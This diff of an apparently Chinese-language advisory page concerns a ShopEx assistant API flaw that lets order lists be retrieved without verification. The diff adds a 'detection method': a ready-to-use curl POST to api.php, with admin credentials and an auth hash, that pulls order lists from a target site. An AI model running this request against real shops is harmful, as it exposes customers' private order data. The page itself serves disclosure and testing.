@@ -10,7 +10,7 @@
 
 <DIV CLASS="header" ID="header">
 <H1>ShopEx助理api接口过滤不严</H1>
-<H2>last modify 2010-09-19 17:19:36 Sunday</H2>
+<H2>last modify 2010-09-19 17:35:48 Sunday</H2>
 </DIV>
 
 <DIV CLASS="body" ID="body">
@@ -47,6 +47,21 @@ ShopEx48系列 &lt;= 45144
 中是否跳过验证'n_varify'设置为true,导致不需要验证也可以获取用户订单列表
 </P>
 <H4>检测方法</H4>
+<P>
+方法1
+</P>
+<PRE>
+
+curl -d "act=search_order_list&amp;api_version=1.0&amp;counts=50&amp;last_modify_st_time=0&amp;last_modify_en_time=300000000000&amp;pages=0&amp;password=gkk522004&amp;status=active&amp;tolken=&amp;username=admin&amp;ac=C30F2929C886AA28CF5F0276729374C5" http://www.xxx.com/api.php
+
+</PRE>
+<P></P>
+<P>
+<A HREF="http://www.xxx.com">http://www.xxx.com</A>换成用户的实际地址！
+</P>
+<P>
+方法2：
+</P>
 <P>
 下载这个程序
 </P>
